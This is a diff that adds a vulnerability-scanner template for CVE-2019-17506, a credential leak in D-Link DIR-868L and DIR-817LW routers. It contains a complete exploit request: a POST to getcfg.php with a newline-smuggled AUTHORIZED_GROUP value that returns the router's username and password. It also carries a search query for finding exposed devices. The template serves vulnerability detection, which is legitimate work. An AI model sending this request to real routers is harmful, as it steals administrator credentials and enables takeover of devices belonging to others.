@@ -1,0 +1,25 @@
+name: Dlink Info Leak CVE-2019-17506
+manual: true
+query: app="D_Link-Router"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /getcfg.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: SERVICES=DEVICE.ACCOUNT&AUTHORIZED_GROUP=1%0a
+    expression: response.status == 200 && response.body.bcontains(b"&lt;name&gt;")
+      && response.body.bcontains(b"&lt;password&gt;")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://xz.aliyun.com/t/6453
+  description: There are some web interfaces without authentication requirements on
+    D-Link DIR-868L B1-2.03 and DIR-817LW A1-1.04 routers. An attacker can get the
+    router's username and password (and other information) via a DEVICE.ACCOUNT value
+    for SERVICES in conjunction with AUTHORIZED_GROUP=1%0a to getcfg.php. This could
+    be used to control the router remotely.
+  tags: infoleak
